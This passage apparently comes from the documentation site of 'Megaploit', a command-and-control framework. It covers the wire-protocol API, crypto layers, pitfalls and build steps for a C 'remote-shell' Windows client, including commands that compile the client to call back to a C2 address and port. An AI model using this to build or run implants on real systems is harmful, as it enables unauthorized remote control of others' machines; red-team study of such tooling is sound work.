+<p>The prober checks 46 signals across four layers. The 33 <strong>required</strong> signals
+are the ones the <code>generate_c</code> build will refuse to skip:</p>
+<p><strong>Layer 1 — SChannel TLS (16 required signals)</strong></p>
+<p><code>SP_PROT_TLS1_2_CLIENT</code>, <code>SCH_USE_STRONG_CRYPTO</code>, <code>SCH_CRED_NO_DEFAULT_CREDS</code>,
+<code>SCH_CRED_MANUAL_CRED_VALIDATION</code>, <code>ISC_REQ_CONFIDENTIALITY</code>,
+<code>ISC_REQ_SEQUENCE_DETECT</code>, <code>ISC_REQ_REPLAY_DETECT</code>, <code>ISC_REQ_STREAM</code>,
+<code>AcquireCredentialsHandle[AW]</code>, <code>InitializeSecurityContext[AW]</code>,
+<code>EncryptMessage</code>, <code>DecryptMessage</code>, <code>SECBUFFER_TOKEN</code>,
+<code>SECPKG_ATTR_STREAM_SIZES</code>, <code>SCHANNEL_SHUTDOWN</code>, <code>grbitEnabledProtocols</code></p>
+<p><strong>Layer 2 — HMAC-SHA256 (5 required signals)</strong></p>
+<p><code>BCRYPT_ALG_HANDLE_HMAC_FLAG</code>, <code>BCRYPT_SHA256_ALGORITHM</code>, <code>BCryptCreateHash</code>,
+<code>BCryptHashData</code>, <code>BCryptFinishHash</code></p>
+<p><strong>Layer 3 — Protocol v2 (1 required signal)</strong></p>
+<p><code>TLS_V2_MAGIC</code> / <code>0x4D</code></p>
+<p><strong>Layer 4 — AES-256-GCM (11 required signals)</strong></p>
+<p><code>BCRYPT_AES_ALGORITHM</code>, <code>BCRYPT_CHAIN_MODE_GCM</code>, <code>BCryptEncrypt</code>,
+<code>BCryptDecrypt</code>, <code>BCryptGenRandom</code>,
+<code>BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO</code> / <code>BCRYPT_INIT_AUTH_MODE_INFO</code>,
+uint32-BE frame header, uint64-BE sequence number, big-endian helpers,
+strict monotonic sequence check (<code>recvSeq &lt;=</code> guard)</p>
+<h3 id="52-auto-registration-of-c-exclusive-verbs">5.2 Auto-registration of C-exclusive verbs<a class="headerlink" href="#52-auto-registration-of-c-exclusive-verbs" title="Permanent link">&para;</a></h3>
+<p><code>c_exclusive_verbs()</code> scans every <code>.c</code> file for <code>strncmp("VERB", ...)</code> calls
+and returns verbs not present in the Python agent. <code>commands.py</code> calls this
+at import time and registers an operator command for each one.</p>
+<p>To add a new C-exclusive command:</p>
+<div class="language-c highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a><span class="cm">/* 1. In client/shell.c — add a dispatch branch: */</span>
+</span><span id="__span-18-2"><a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">cbCmd</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="mi">8</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">strncmp</span><span class="p">(</span><span class="s">&quot;reboot()&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">cmd</span><span class="p">,</span><span class="w"> </span><span class="mi">8</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-18-3"><a id="__codelineno-18-3" name="__codelineno-18-3" href="#__codelineno-18-3"></a><span class="w">    </span><span class="n">_handle_reboot</span><span class="p">(</span><span class="n">pTls</span><span class="p">);</span>
+</span><span id="__span-18-4"><a id="__codelineno-18-4" name="__codelineno-18-4" href="#__codelineno-18-4"></a><span class="w">    </span><span class="k">return</span><span class="p">;</span>
+</span><span id="__span-18-5"><a id="__codelineno-18-5" name="__codelineno-18-5" href="#__codelineno-18-5"></a><span class="p">}</span>
+</span></code></pre></div>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a># 2. Restart the Megaploit server.
+</span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a>#    &quot;reboot&quot; will appear in `help` automatically — no Python changes needed.
+</span></code></pre></div>
+<hr />
+<h2 id="6-megaploit_protocolh-api">6. <code>megaploit_protocol.h</code> API<a class="headerlink" href="#6-megaploit_protocolh-api" title="Permanent link">&para;</a></h2>
+<p>The single-header library lives at
+<a href="../plugins/native_sdk/megaploit_protocol.h"><code>plugins/native_sdk/megaploit_protocol.h</code></a>.
+Include it in any C/C++ program that needs to speak the wire protocol.</p>
+<h3 id="61-connection-state">6.1 Connection state<a class="headerlink" href="#61-connection-state" title="Permanent link">&para;</a></h3>
+<div class="language-c highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a><span class="n">mp_conn_t</span><span class="w"> </span><span class="n">c</span><span class="p">;</span>
+</span><span id="__span-20-2"><a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a><span class="n">mp_init</span><span class="p">(</span><span class="o">&amp;</span><span class="n">c</span><span class="p">,</span><span class="w"> </span><span class="n">fd</span><span class="p">,</span><span class="w"> </span><span class="n">use_v2</span><span class="p">,</span><span class="w"> </span><span class="n">key</span><span class="p">);</span><span class="w">   </span><span class="cm">/* key may be NULL for plaintext */</span>
+</span></code></pre></div>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Type</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>fd</code></td>
+<td><code>mp_fd_t</code></td>
+<td>Socket file descriptor (SOCKET on Windows, int on POSIX)</td>
+</tr>
+<tr>
+<td><code>encrypted</code></td>
+<td><code>int</code></td>
+<td>1 = AES-GCM active, 0 = plaintext</td>
+</tr>
+<tr>
+<td><code>key[32]</code></td>
+<td><code>uint8_t</code></td>
+<td>Shared secret (zeroed for plaintext)</td>
+</tr>
+<tr>
+<td><code>send_seq</code></td>
+<td><code>uint64_t</code></td>
+<td>Outgoing monotonic counter (starts at 0, incremented before each send)</td>
+</tr>
+<tr>
+<td><code>recv_seq</code></td>
+<td><code>int64_t</code></td>
+<td>Last accepted incoming seq (-1 = nothing received yet)</td>
+</tr>
+</tbody>
+</table>
+<h3 id="62-core-functions">6.2 Core functions<a class="headerlink" href="#62-core-functions" title="Permanent link">&para;</a></h3>
+<div class="language-c highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a><span class="cm">/* Initialise a connection state struct */</span>
+</span><span id="__span-21-2"><a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a><span class="kt">void</span><span class="w"> </span><span class="nf">mp_init</span><span class="p">(</span><span class="n">mp_conn_t</span><span class="w"> </span><span class="o">*</span><span class="n">c</span><span class="p">,</span><span class="w"> </span><span class="n">mp_fd_t</span><span class="w"> </span><span class="n">fd</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">encrypted</span><span class="p">,</span><span class="w"> </span><span class="k">const</span><span class="w"> </span><span class="kt">uint8_t</span><span class="w"> </span><span class="o">*</span><span class="n">key</span><span class="p">);</span>
+</span><span id="__span-21-3"><a id="__codelineno-21-3" name="__codelineno-21-3" href="#__codelineno-21-3"></a>
+</span><span id="__span-21-4"><a id="__codelineno-21-4" name="__codelineno-21-4" href="#__codelineno-21-4"></a><span class="cm">/* Send a JSON-encoded string as one framed message */</span>
+</span><span id="__span-21-5"><a id="__codelineno-21-5" name="__codelineno-21-5" href="#__codelineno-21-5"></a><span class="kt">int</span><span class="w"> </span><span class="nf">mp_send_msg</span><span class="p">(</span><span class="n">mp_conn_t</span><span class="w"> </span><span class="o">*</span><span class="n">c</span><span class="p">,</span><span class="w"> </span><span class="k">const</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">json_str</span><span class="p">);</span>
+</span><span id="__span-21-6"><a id="__codelineno-21-6" name="__codelineno-21-6" href="#__codelineno-21-6"></a>
+</span><span id="__span-21-7"><a id="__codelineno-21-7" name="__codelineno-21-7" href="#__codelineno-21-7"></a><span class="cm">/* Receive one framed message; *out must be free()&#39;d by caller */</span>
+</span><span id="__span-21-8"><a id="__codelineno-21-8" name="__codelineno-21-8" href="#__codelineno-21-8"></a><span class="kt">int</span><span class="w"> </span><span class="nf">mp_recv_msg</span><span class="p">(</span><span class="n">mp_conn_t</span><span class="w"> </span><span class="o">*</span><span class="n">c</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">**</span><span class="n">out</span><span class="p">);</span>
+</span><span id="__span-21-9"><a id="__codelineno-21-9" name="__codelineno-21-9" href="#__codelineno-21-9"></a>
+</span><span id="__span-21-10"><a id="__codelineno-21-10" name="__codelineno-21-10" href="#__codelineno-21-10"></a><span class="cm">/* Low-level: send/receive one raw frame (no seq/encrypt wrapping) */</span>
+</span><span id="__span-21-11"><a id="__codelineno-21-11" name="__codelineno-21-11" href="#__codelineno-21-11"></a><span class="kt">int</span><span class="w"> </span><span class="nf">mp_send_frame</span><span class="p">(</span><span class="n">mp_conn_t</span><span class="w"> </span><span class="o">*</span><span class="n">c</span><span class="p">,</span><span class="w"> </span><span class="k">const</span><span class="w"> </span><span class="kt">uint8_t</span><span class="w"> </span><span class="o">*</span><span class="n">payload</span><span class="p">,</span><span class="w"> </span><span class="kt">size_t</span><span class="w"> </span><span class="n">len</span><span class="p">);</span>
+</span><span id="__span-21-12"><a id="__codelineno-21-12" name="__codelineno-21-12" href="#__codelineno-21-12"></a><span class="kt">int</span><span class="w"> </span><span class="nf">mp_recv_frame</span><span class="p">(</span><span class="n">mp_conn_t</span><span class="w"> </span><span class="o">*</span><span class="n">c</span><span class="p">,</span><span class="w"> </span><span class="kt">uint8_t</span><span class="w"> </span><span class="o">**</span><span class="n">out</span><span class="p">,</span><span class="w"> </span><span class="kt">size_t</span><span class="w"> </span><span class="o">*</span><span class="n">out_len</span><span class="p">);</span>
+</span><span id="__span-21-13"><a id="__codelineno-21-13" name="__codelineno-21-13" href="#__codelineno-21-13"></a>
+</span><span id="__span-21-14"><a id="__codelineno-21-14" name="__codelineno-21-14" href="#__codelineno-21-14"></a><span class="cm">/* Exact-size receive/send helpers */</span>
+</span><span id="__span-21-15"><a id="__codelineno-21-15" name="__codelineno-21-15" href="#__codelineno-21-15"></a><span class="kt">int</span><span class="w"> </span><span class="nf">mp_recv_exactly</span><span class="p">(</span><span class="n">mp_fd_t</span><span class="w"> </span><span class="n">fd</span><span class="p">,</span><span class="w"> </span><span class="kt">uint8_t</span><span class="w"> </span><span class="o">*</span><span class="n">buf</span><span class="p">,</span><span class="w"> </span><span class="kt">size_t</span><span class="w"> </span><span class="n">n</span><span class="p">);</span>
+</span><span id="__span-21-16"><a id="__codelineno-21-16" name="__codelineno-21-16" href="#__codelineno-21-16"></a><span class="kt">int</span><span class="w"> </span><span class="nf">mp_send_all</span><span class="w">    </span><span class="p">(</span><span class="n">mp_fd_t</span><span class="w"> </span><span class="n">fd</span><span class="p">,</span><span class="w"> </span><span class="k">const</span><span class="w"> </span><span class="kt">uint8_t</span><span class="w"> </span><span class="o">*</span><span class="n">buf</span><span class="p">,</span><span class="w"> </span><span class="kt">size_t</span><span class="w"> </span><span class="n">n</span><span class="p">);</span>
+</span><span id="__span-21-17"><a id="__codelineno-21-17" name="__codelineno-21-17" href="#__codelineno-21-17"></a>
+</span><span id="__span-21-18"><a id="__codelineno-21-18" name="__codelineno-21-18" href="#__codelineno-21-18"></a><span class="cm">/* Big-endian helpers */</span>
+</span><span id="__span-21-19"><a id="__codelineno-21-19" name="__codelineno-21-19" href="#__codelineno-21-19"></a><span class="kt">uint32_t</span><span class="w"> </span><span class="nf">mp_be32</span><span class="p">(</span><span class="k">const</span><span class="w"> </span><span class="kt">uint8_t</span><span class="w"> </span><span class="o">*</span><span class="n">b</span><span class="p">);</span>
+</span><span id="__span-21-20"><a id="__codelineno-21-20" name="__codelineno-21-20" href="#__codelineno-21-20"></a><span class="kt">uint64_t</span><span class="w"> </span><span class="nf">mp_be64</span><span class="p">(</span><span class="k">const</span><span class="w"> </span><span class="kt">uint8_t</span><span class="w"> </span><span class="o">*</span><span class="n">b</span><span class="p">);</span>
+</span><span id="__span-21-21"><a id="__codelineno-21-21" name="__codelineno-21-21" href="#__codelineno-21-21"></a><span class="kt">void</span><span class="w">     </span><span class="nf">mp_put_be32</span><span class="p">(</span><span class="kt">uint8_t</span><span class="w"> </span><span class="o">*</span><span class="n">b</span><span class="p">,</span><span class="w"> </span><span class="kt">uint32_t</span><span class="w"> </span><span class="n">v</span><span class="p">);</span>
+</span><span id="__span-21-22"><a id="__codelineno-21-22" name="__codelineno-21-22" href="#__codelineno-21-22"></a><span class="kt">void</span><span class="w">     </span><span class="nf">mp_put_be64</span><span class="p">(</span><span class="kt">uint8_t</span><span class="w"> </span><span class="o">*</span><span class="n">b</span><span class="p">,</span><span class="w"> </span><span class="kt">uint64_t</span><span class="w"> </span><span class="n">v</span><span class="p">);</span>
+</span></code></pre></div>
+<h3 id="63-error-codes">6.3 Error codes<a class="headerlink" href="#63-error-codes" title="Permanent link">&para;</a></h3>
+<table>
+<thead>
+<tr>
+<th>Code</th>
+<th>Value</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>MP_OK</code></td>
+<td><code>0</code></td>
+<td>Success</td>
+</tr>
+<tr>
+<td><code>MP_ERR_IO</code></td>
+<td><code>-1</code></td>
+<td>Socket read/write failed or EOF</td>
+</tr>
+<tr>
+<td><code>MP_ERR_OOM</code></td>
+<td><code>-2</code></td>
+<td><code>malloc</code> returned NULL</td>
+</tr>
+<tr>
+<td><code>MP_ERR_REPLAY</code></td>
+<td><code>-3</code></td>
+<td>Sequence number out of order</td>
+</tr>
+<tr>
+<td><code>MP_ERR_CRYPTO</code></td>
+<td><code>-4</code></td>
+<td>AES-GCM authentication failure</td>
+</tr>
+<tr>
+<td><code>MP_ERR_TOOBIG</code></td>
+<td><code>-5</code></td>
+<td>Frame header exceeds <code>MP_MAX_MSG</code></td>
+</tr>
+</tbody>
+</table>
+<h3 id="64-aes-256-gcm-openssl">6.4 AES-256-GCM (OpenSSL)<a class="headerlink" href="#64-aes-256-gcm-openssl" title="Permanent link">&para;</a></h3>
+<p>Define <code>MEGAPLOIT_USE_OPENSSL</code> before including the header to enable the
+OpenSSL AES-GCM helpers:</p>
+<div class="language-c highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a><span class="cp">#define MEGAPLOIT_USE_OPENSSL</span>
+</span><span id="__span-22-2"><a id="__codelineno-22-2" name="__codelineno-22-2" href="#__codelineno-22-2"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&quot;megaploit_protocol.h&quot;</span>
+</span><span id="__span-22-3"><a id="__codelineno-22-3" name="__codelineno-22-3" href="#__codelineno-22-3"></a>
+</span><span id="__span-22-4"><a id="__codelineno-22-4" name="__codelineno-22-4" href="#__codelineno-22-4"></a><span class="cm">/* Encrypt: out must be plain_len + MP_TAG_LEN bytes */</span>
+</span><span id="__span-22-5"><a id="__codelineno-22-5" name="__codelineno-22-5" href="#__codelineno-22-5"></a><span class="kt">int</span><span class="w"> </span><span class="nf">mp_gcm_encrypt</span><span class="p">(</span><span class="k">const</span><span class="w"> </span><span class="kt">uint8_t</span><span class="w"> </span><span class="o">*</span><span class="n">key</span><span class="p">,</span><span class="w"> </span><span class="k">const</span><span class="w"> </span><span class="kt">uint8_t</span><span class="w"> </span><span class="o">*</span><span class="n">nonce</span><span class="p">,</span>
+</span><span id="__span-22-6"><a id="__codelineno-22-6" name="__codelineno-22-6" href="#__codelineno-22-6"></a><span class="w">                   </span><span class="k">const</span><span class="w"> </span><span class="kt">uint8_t</span><span class="w"> </span><span class="o">*</span><span class="n">plain</span><span class="p">,</span><span class="w"> </span><span class="kt">size_t</span><span class="w"> </span><span class="n">plain_len</span><span class="p">,</span>
+</span><span id="__span-22-7"><a id="__codelineno-22-7" name="__codelineno-22-7" href="#__codelineno-22-7"></a><span class="w">                   </span><span class="kt">uint8_t</span><span class="w"> </span><span class="o">*</span><span class="n">out</span><span class="p">,</span><span class="w"> </span><span class="kt">size_t</span><span class="w"> </span><span class="o">*</span><span class="n">out_len</span><span class="p">);</span>
+</span><span id="__span-22-8"><a id="__codelineno-22-8" name="__codelineno-22-8" href="#__codelineno-22-8"></a>
+</span><span id="__span-22-9"><a id="__codelineno-22-9" name="__codelineno-22-9" href="#__codelineno-22-9"></a><span class="cm">/* Decrypt: ct_tag = ciphertext || 16-byte tag */</span>
+</span><span id="__span-22-10"><a id="__codelineno-22-10" name="__codelineno-22-10" href="#__codelineno-22-10"></a><span class="kt">int</span><span class="w"> </span><span class="nf">mp_gcm_decrypt</span><span class="p">(</span><span class="k">const</span><span class="w"> </span><span class="kt">uint8_t</span><span class="w"> </span><span class="o">*</span><span class="n">key</span><span class="p">,</span><span class="w"> </span><span class="k">const</span><span class="w"> </span><span class="kt">uint8_t</span><span class="w"> </span><span class="o">*</span><span class="n">nonce</span><span class="p">,</span>
+</span><span id="__span-22-11"><a id="__codelineno-22-11" name="__codelineno-22-11" href="#__codelineno-22-11"></a><span class="w">                   </span><span class="k">const</span><span class="w"> </span><span class="kt">uint8_t</span><span class="w"> </span><span class="o">*</span><span class="n">ct_tag</span><span class="p">,</span><span class="w"> </span><span class="kt">size_t</span><span class="w"> </span><span class="n">ct_tag_len</span><span class="p">,</span>
+</span><span id="__span-22-12"><a id="__codelineno-22-12" name="__codelineno-22-12" href="#__codelineno-22-12"></a><span class="w">                   </span><span class="kt">uint8_t</span><span class="w"> </span><span class="o">*</span><span class="n">out</span><span class="p">,</span><span class="w"> </span><span class="kt">size_t</span><span class="w"> </span><span class="o">*</span><span class="n">out_len</span><span class="p">);</span>
+</span></code></pre></div>
+<p>Link with <code>-lssl -lcrypto</code> (Linux/macOS) or the appropriate OpenSSL import
+libraries on Windows.</p>
+<h3 id="65-windows-schannel-alternative">6.5 Windows (SChannel) alternative<a class="headerlink" href="#65-windows-schannel-alternative" title="Permanent link">&para;</a></h3>
+<p>For Windows-native TLS without OpenSSL, use the C-remote-shell TLS layer
+(<code>C-remote-shell/tls/tls_client.h</code>) instead. It implements the same four
+security layers using SChannel + BCrypt — no third-party dependencies.</p>
+<hr />
+<h2 id="7-common-pitfalls">7. Common Pitfalls<a class="headerlink" href="#7-common-pitfalls" title="Permanent link">&para;</a></h2>
+<p>These are the exact mistakes that cause the Python server to silently drop
+or reject your client:</p>
+<table>
+<thead>
+<tr>
+<th>Mistake</th>
+<th>Correct behaviour</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Sending raw text without the 8-byte sequence prefix</td>
+<td>Prepend <code>uint64-BE seq</code> to every payload before encrypting / sending</td>
+</tr>
+<tr>
+<td>JSON object/array instead of JSON string</td>
+<td>Every payload must be a JSON <strong>string</strong>: <code>"\"ls -la\""</code>, not <code>"{\"cmd\":\"ls\"}"</code></td>
+</tr>
+<tr>
+<td>Little-endian length or sequence</td>
+<td>Both the 4-byte length prefix and 8-byte seq must be <strong>big-endian</strong></td>
+</tr>
+<tr>
+<td>Reusing a sequence number</td>
+<td>Increment <code>send_seq</code> before every send; server rejects <code>seq &lt;= last_seen</code></td>
+</tr>
+<tr>
+<td>AES-GCM nonce after the ciphertext</td>
+<td>Layout: <code>nonce(12) || ciphertext || tag(16)</code> — nonce comes <strong>first</strong></td>
+</tr>
+<tr>
+<td>Missing 16-byte GCM auth tag</td>
+<td>The tag is appended after the ciphertext; its absence fails <code>DecryptFinal</code></td>
+</tr>
+<tr>
+<td>Echoing a different version byte</td>
+<td>Echo back <strong>exactly</strong> the 1-byte version the server sent</td>
+</tr>
+<tr>
+<td>HMAC over the wrong data</td>
+<td>Compute <code>HMAC-SHA256(key, challenge)</code> — key first, challenge second</td>
+</tr>
+<tr>
+<td>Allocating less than 16 384 bytes for a TLS receive buffer</td>
+<td>A single TLS record can be up to 16 384 bytes (RFC 5246 §6.2.1)</td>
+</tr>
+<tr>
+<td>Accepting frames larger than 256 MiB</td>
+<td>Reject any frame header &gt; <code>MP_MAX_MSG</code> before allocating</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="8-compiler-requirements">8. Compiler Requirements<a class="headerlink" href="#8-compiler-requirements" title="Permanent link">&para;</a></h2>
+<h3 id="native-plugins-kind-native">Native plugins (<code>kind = "native"</code>)<a class="headerlink" href="#native-plugins-kind-native" title="Permanent link">&para;</a></h3>
+<table>
+<thead>
+<tr>
+<th>Platform</th>
+<th>Compiler</th>
+<th>Install</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Linux / macOS</td>
+<td><code>gcc</code> or <code>clang</code></td>
+<td><code>apt install gcc</code> / <code>brew install gcc</code></td>
+</tr>
+<tr>
+<td>Windows</td>
+<td><code>gcc</code> via MinGW</td>
+<td><code>winget install msys2</code> → <code>pacman -S mingw-w64-x86_64-gcc</code></td>
+</tr>
+</tbody>
+</table>
+<p>The runner auto-detects the first available compiler. No configuration needed.</p>
+<h3 id="c-remote-shell-client-windows-exe">C-remote-shell client (Windows EXE)<a class="headerlink" href="#c-remote-shell-client-windows-exe" title="Permanent link">&para;</a></h3>
+<table>
+<thead>
+<tr>
+<th>Compiler</th>
+<th>How to get it</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>MSVC <code>cl.exe</code></td>
+<td>Install Visual Studio; open "Developer Command Prompt for VS"</td>
+</tr>
+<tr>
+<td>MinGW <code>x86_64-w64-mingw32-gcc</code></td>
+<td>Linux/macOS: <code>apt install mingw-w64</code></td>
+</tr>
+</tbody>
+</table>
+<p>Required linker libraries:
+<code>Secur32.lib  Crypt32.lib  ws2_32.lib  bcrypt.lib  Advapi32.lib  User32.lib</code></p>
+<p>Build via the C2 console:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a>megaploit&gt; generate_c 10.0.0.1 4444
+</span></code></pre></div>
+<p>Or manually with the Makefile:</p>
+<div class="language-bat highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a><span class="k">cd</span> C-remote-shell
+</span><span id="__span-24-2"><a id="__codelineno-24-2" name="__codelineno-24-2" href="#__codelineno-24-2"></a>make C2_IP=10.0.0.1 C2_PORT=4444
+</span></code></pre></div>
+<hr />
+<p><em>See also:</em>
+- <a href="../plugins/native_sdk/megaploit_protocol.h"><code>plugins/native_sdk/megaploit_protocol.h</code></a> — single-header protocol library
+- <a href="../plugins/native_sdk/example_plugin.cpp"><code>plugins/native_sdk/example_plugin.cpp</code></a> — working native plugin example
+- <a href="../plugins/native_sdk/example_native.toml"><code>plugins/native_sdk/example_native.toml</code></a> — plugin descriptor for the example
+- <a href="../C-remote-shell/README.md"><code>C-remote-shell/README.md</code></a> — C-remote-shell integration guide
+- <a href="../C-remote-shell/CHANGELOG.md"><code>C-remote-shell/CHANGELOG.md</code></a> — bug-fix log and developer guide
+- <a href="../megaploit/core/c_probe.py"><code>megaploit/core/c_probe.py</code></a> — C2 compliance prober
+- <a href="../megaploit/core/protocol.py"><code>megaploit/core/protocol.py</code></a> — authoritative Python protocol implementation
+- <a href="../megaploit/core/crypto.py"><code>megaploit/core/crypto.py</code></a> — HMAC-SHA256 authentication</p>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+  <script>var tabs=__md_get("__tabs");if(Array.isArray(tabs))e:for(var set of document.querySelectorAll(".tabbed-set")){var labels=set.querySelector(".tabbed-labels");for(var tab of tabs)for(var label of labels.getElementsByTagName("label"))if(label.innerText.trim()===tab){var input=document.getElementById(label.htmlFor);input.checked=!0;continue e}}</script>
+
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    
+      
+      <nav class="md-footer__inner md-grid" aria-label="Footer" >
+        
+          
+          <a href="../NETWORKING/" class="md-footer__link md-footer__link--prev" aria-label="Previous: Networking">
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+            </div>
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Previous
+              </span>
+              <div class="md-ellipsis">
+                Networking
+              </div>
+            </div>
+          </a>
+        
+        
+      </nav>
+    
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "..", "features": ["navigation.tabs", "navigation.sections", "navigation.expand", "navigation.top", "navigation.footer", "search.suggest", "search.highlight", "content.code.copy", "content.code.annotate", "content.tabs.link", "toc.integrate"], "search": "../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../assets/javascripts/bundle.d7400e89.min.js"></script>
+      
+    
+  </body>
+</html>
